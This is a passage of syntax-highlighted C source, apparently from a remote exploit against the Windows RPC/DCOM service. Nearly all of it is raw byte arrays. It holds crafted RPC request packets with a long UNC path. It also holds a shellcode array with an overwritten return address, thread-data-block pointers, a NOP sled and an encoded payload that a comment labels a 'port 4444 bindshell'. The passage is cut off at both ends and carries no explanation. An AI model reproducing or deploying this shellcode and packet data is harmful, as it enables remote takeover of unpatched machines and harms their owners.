</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x78</span><span class="sc10">,</span><span class="sc4">0x19</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x06</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x70</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0x98</span><span class="sc10">,</span><span class="sc4">0x93</span><span class="sc10">,</span><span class="sc4">0x98</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0xD2</span><span class="sc10">,</span><span class="sc4">0x11</span><span class="sc10">,</span><span class="sc4">0xA9</span><span class="sc10">,</span><span class="sc4">0x3D</span><span class="sc10">,</span><span class="sc4">0xBE</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0xB2</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x32</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0xF0</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x18</span><span class="sc10">,</span><span class="sc4">0x43</span><span class="sc10">,</span><span class="sc4">0x14</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x3B</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x81</span><span class="sc10">,</span><span class="sc4">0xC5</span><span class="sc10">,</span><span class="sc4">0x17</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0xE9</span><span class="sc10">,</span><span class="sc4">0x4A</span><span class="sc10">,</span><span class="sc4">0x99</span><span class="sc10">,</span><span class="sc4">0x99</span><span class="sc10">,</span><span class="sc4">0xF1</span><span class="sc10">,</span><span class="sc4">0x8A</span><span class="sc10">,</span><span class="sc4">0x50</span><span class="sc10">,</span><span class="sc4">0x6F</span><span class="sc10">,</span><span class="sc4">0x7A</span><span class="sc10">,</span><span class="sc4">0x85</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x78</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x6E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0xDA</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x2F</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x2E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x68</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0x68</span><span class="sc10">,</span><span class="sc4">0x8B</span><span class="sc10">,</span><span class="sc4">0x0B</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request2</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request3</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x43</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x24</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x5C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x32</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x33</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x34</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x35</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x36</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x31</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x2E</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x64</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x6F</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x63</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">


</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">sc</span><span class="sc10">[]=</span><span class="sc0">
</span><span class="sc6">"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00"</span><span class="sc0">
</span><span class="sc6">"\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00"</span><span class="sc0">
</span><span class="sc6">"\x46\x00\x58\x00\x46\x00\x58\x00"</span><span class="sc0">

</span><span class="sc6">"\xff\xff\xff\xff"</span><span class="sc0"> </span><span class="sc1">/* return address */</span><span class="sc0">

</span><span class="sc6">"\xcc\xe0\xfd\x7f"</span><span class="sc0"> </span><span class="sc1">/* primary thread data block */</span><span class="sc0">
</span><span class="sc6">"\xcc\xe0\xfd\x7f"</span><span class="sc0"> </span><span class="sc1">/* primary thread data block */</span><span class="sc0">

</span><span class="sc1">/* port 4444 bindshell */</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"</span><span class="sc0">
</span><span class="sc6">"\x90\x90\x90\x90\x90\x90\x90\xeb\x19\x5e\x31\xc9\x81\xe9\x89\xff"</span><span class="sc0">
</span><span class="sc6">"\xff\xff\x81\x36\x80\xbf\x32\x94\x81\xee\xfc\xff\xff\xff\xe2\xf2"</span><span class="sc0">
</span><span class="sc6">"\xeb\x05\xe8\xe2\xff\xff\xff\x03\x53\x06\x1f\x74\x57\x75\x95\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\xbb\x92\x7f\x89\x5a\x1a\xce\xb1\xde\x7c\xe1\xbe\x32\x94\x09"</span><span class="sc0">
</span><span class="sc6">"\xf9\x3a\x6b\xb6\xd7\x9f\x4d\x85\x71\xda\xc6\x81\xbf\x32\x1d\xc6"</span><span class="sc0">
</span><span class="sc6">"\xb3\x5a\xf8\xec\xbf\x32\xfc\xb3\x8d\x1c\xf0\xe8\xc8\x41\xa6\xdf"</span><span class="sc0">
</span><span class="sc6">"\xeb\xcd\xc2\x88\x36\x74\x90\x7f\x89\x5a\xe6\x7e\x0c\x24\x7c\xad"</span><span class="sc0">
</span><span class="sc6">"\xbe\x32\x94\x09\xf9\x22\x6b\xb6\xd7\x4c\x4c\x62\xcc\xda\x8a\x81"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\xab\xcd\xe2\x84\xd7\xf9\x79\x7c\x84\xda\x9a\x81"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\xa7\xcd\xe2\x84\xd7\xeb\x9d\x75\x12\xda\x6a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\xa3\xcd\xe2\x84\xd7\x96\x8e\xf0\x78\xda\x7a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x9f\xcd\xe2\x84\xd7\x96\x39\xae\x56\xda\x4a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x9b\xcd\xe2\x84\xd7\xd7\xdd\x06\xf6\xda\x5a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x97\xcd\xe2\x84\xd7\xd5\xed\x46\xc6\xda\x2a\x80"</span><span class="sc0">
</span><span class="sc6">"\xbf\x32\x1d\xc6\x93\x01\x6b\x01\x53\xa2\x95\x80\xbf\x66\xfc\x81"</span><span class="sc0">
</span><span class="sc6">"\xbe\x32\x94\x7f\xe9\x2a\xc4\xd0\xef\x62\xd4\xd0\xff\x62\x6b\xd6"</span><span class="sc0">
</span><span class="sc6">"\xa3\xb9\x4c\xd7\xe8\x5a\x96\x80\xae\x6e\x1f\x4c\xd5\x24\xc5\xd3"</span><span class="sc0">
</span><span class="sc6">"\x40\x64\xb4\xd7\xec\xcd\xc2\xa4\xe8\x63\xc7\x7f\xe9\x1a\x1f\x50"</span><span class="sc0">
</span><span class="sc6">"\xd7\x57\xec\xe5\xbf\x5a\xf7\xed\xdb\x1c\x1d\xe6\x8f\xb1\x78\xd4"</span><span class="sc0">
</span><span class="sc6">"\x32\x0e\xb0\xb3\x7f\x01\x5d\x03\x7e\x27\x3f\x62\x42\xf4\xd0\xa4"</span><span class="sc0">
</span><span class="sc6">"\xaf\x76\x6a\xc4\x9b\x0f\x1d\xd4\x9b\x7a\x1d\xd4\x9b\x7e\x1d\xd4"</span><span class="sc0">
</span><span class="sc6">"\x9b\x62\x19\xc4\x9b\x22\xc0\xd0\xee\x63\xc5\xea\xbe\x63\xc5\x7f"</span><span class="sc0">
</span><span class="sc6">"\xc9\x02\xc5\x7f\xe9\x22\x1f\x4c\xd5\xcd\x6b\xb1\x40\x64\x98\x0b"</span><span class="sc0">
</span><span class="sc6">"\x77\x65\x6b\xd6\x93\xcd\xc2\x94\xea\x64\xf0\x21\x8f\x32\x94\x80"</span><span class="sc0">
</span><span class="sc6">"\x3a\xf2\xec\x8c\x34\x72\x98\x0b\xcf\x2e\x39\x0b\xd7\x3a\x7f\x89"</span><span class="sc0">
</span><span class="sc6">"\x34\x72\xa0\x0b\x17\x8a\x94\x80\xbf\xb9\x51\xde\xe2\xf0\x90\x80"</span><span class="sc0">
</span><span class="sc6">"\xec\x67\xc2\xd7\x34\x5e\xb0\x98\x34\x77\xa8\x0b\xeb\x37\xec\x83"</span><span class="sc0">
</span><span class="sc6">"\x6a\xb9\xde\x98\x34\x68\xb4\x83\x62\xd1\xa6\xc9\x34\x06\x1f\x83"</span><span class="sc0">
</span><span class="sc6">"\x4a\x01\x6b\x7c\x8c\xf2\x38\xba\x7b\x46\x93\x41\x70\x3f\x97\x78"</span><span class="sc0">
</span><span class="sc6">"\x54\xc0\xaf\xfc\x9b\x26\xe1\x61\x34\x68\xb0\x83\x62\x54\x1f\x8c"</span><span class="sc0">
</span><span class="sc6">"\xf4\xb9\xce\x9c\xbc\xef\x1f\x84\x34\x31\x51\x6b\xbd\x01\x54\x0b"</span><span class="sc0">
</span><span class="sc6">"\x6a\x6d\xca\xdd\xe4\xf0\x90\x80\x2f\xa2\x04"</span><span class="sc10">;</span><span class="sc0">



</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request4</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x2D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

